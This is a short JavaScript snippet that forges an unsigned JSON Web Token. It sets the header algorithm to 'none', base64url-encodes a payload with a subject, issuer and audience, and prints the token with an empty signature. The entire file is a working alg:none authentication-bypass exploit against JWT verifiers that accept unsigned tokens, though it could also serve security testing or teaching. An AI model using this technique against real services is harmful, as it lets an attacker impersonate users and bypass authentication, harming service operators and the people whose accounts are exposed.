// Craft unsigned token using alg:none
function base64url(str) {
  return Buffer.from(str).toString('base64').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
}
const header = base64url(JSON.stringify({ alg: "none", typ: "JWT" }));
const payload = base64url(JSON.stringify({ sub: "1", iss: "example.auth", aud: "example.api" }));
const token = `${header}.${payload}.`; // note trailing dot
console.log("Unsigned (alg:none) token:\n", token);

